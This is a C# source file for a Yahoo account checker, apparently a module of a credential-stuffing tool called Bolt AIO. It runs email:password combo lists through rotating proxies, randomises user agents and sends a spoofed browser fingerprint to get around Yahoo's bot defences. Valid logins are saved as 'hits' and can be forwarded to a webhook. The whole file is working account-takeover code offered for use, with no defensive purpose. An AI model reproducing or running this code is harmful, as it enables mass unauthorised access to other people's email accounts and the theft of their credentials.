using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Yahoomod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text32 = array[0] + ":" + array[1];

                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.KeepAlive = true;

                            var random1 = new Random();
                            string[] header =
                            {
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
                                "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
                                "Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
                                "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
                                "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
                                "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1",
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
                            };
                            var num44 = random1.Next(header.Length);

                            var get = req.Get(new Uri("https://login.yahoo.com/")).ToString();
                            var acrumb = Regex.Match(get, "\"acrumb\" value=\"(.*?)\"").Groups[1].Value;
                            var sindex = Regex.Match(get, "sessionIndex\" value=\"(.*?)\"").Groups[1].Value;
                            var crumb = Regex.Match(get, "\"crumb\" value=\"(.*?)\"").Groups[1].Value;
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                            req.AddHeader("X-Requested-With", "XMLHttpRequest");
                            req.AddHeader("bucket", "mbr-phoenix-gpst");
                            req.UserAgent = header[num44];
                            req.Referer = "https://login.yahoo.com/";
                            req.ConnectTimeout = 10000;
                            var num = (int) DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
                            var httpResponse = req.Post(new Uri("https://login.yahoo.com/"),
                                new BytesContent(Encoding.Default.GetBytes(string.Format(
                                    "acrumb={0}&sessionIndex={1}&username={2}&passwd=&signin=Next&persistent=y&crumb={3}&displayName=&browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A8%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22FOIEJ%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%22e43a8bc708fc490225cde0663b28278c%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.~ANGLE%20(NVIDIA%20Quadro%20{4}%20Direct3D11%20vs_5_0%20ps_5_0)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A49%2C%22hash%22%3A%22411659924ff38420049ac402a30466bc%22%7D%2C%22audio%22%3A%22124.04344884395687%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B%22serve%22%3A{5}385%2C%22render%22%3A{6}591%7D%7D",
                                    acrumb, sindex, array[0], crumb, new Random().Next(1000, 10000), num, num + 1))));
                            var text2 = httpResponse.ToString();
                            if (text2.Contains("\"location\""))
                            {
                                var value = Regex.Match(text2, "\"location\":\"(.*?)\"").Groups[1].Value;
                                if (value.Contains("recaptcha") || value == "")
                                {
                                    Program.Others++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Yahoo_recaptcha", array[0] + ":" + array[1]);
                                }

                                req.ConnectTimeout = 1000;
                                req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                                var httpResponse2 = req.Post(new Uri("https://login.yahoo.com" + value),
                                    new BytesContent(Encoding.Default.GetBytes(string.Concat(
                                        "crumb=czI9ivjtMSr&acrumb=", acrumb, "&sessionIndex=QQ--&displayName=",
                                        array[0], "&passwordContext=normal&password=", array[1],
                                        "&verifyPassword=Next"))));
                                var text3 = httpResponse2.ToString();
                                if (text3.Contains("Make sure your account is secure.") || text3.Contains("Sign Out") ||
                                    text3.Contains("Manage Accounts") ||
                                    text3.Contains("https://login.yahoo.com/account/logout"))
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Yahoo_hits", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG") Settings.PrintHit("Yahoo", array[0] + ":" + array[1]);
                                }

                                if (text3.Contains("For your safety, choose a method below"))
                                {
                                    var httpResponse3 = req.Post(new Uri("https://login.yahoo.com" + value),
                                        new BytesContent(Encoding.Default.GetBytes(
                                            string.Concat("crumb=czI9ivjtMSr&acrumb=", acrumb,
                                                "&sessionIndex=QQ--&displayName=", array[0],
                                                "&passwordContext=normal&password=", array[1],
                                                "&verifyPassword=Next"))));
                                    var text4 = httpResponse2.ToString();
                                    if (text4.Contains("Make sure your account is secure.") ||
                                        text3.Contains("Sign Out") || text3.Contains("Manage Accounts") ||
                                        text3.Contains("https://login.yahoo.com/account/logout"))
                                    {
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Yahoo_hits", array[0] + ":" + array[1]);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Yahoo", array[0] + ":" + array[1]);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1], "Yahoo Hits");
                                    }

                                    if (text4.Contains("For your safety, choose a method below"))
                                    {
                                        Program.Others++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Yahoo_others", array[0] + ":" + array[1]);
                                    }

                                    if (text4.Contains("Invalid password. Please try again"))
                                    {
                                        Program.Fails++;
                                        Program.TotalChecks++;
                                    }
                                }

                                if (text3.Contains("Invalid password. Please try\u00a0again"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                            }
                            else if (text2.Contains("\"AUTH_INVALID_USERNAME_PASSWORD\""))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text32);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}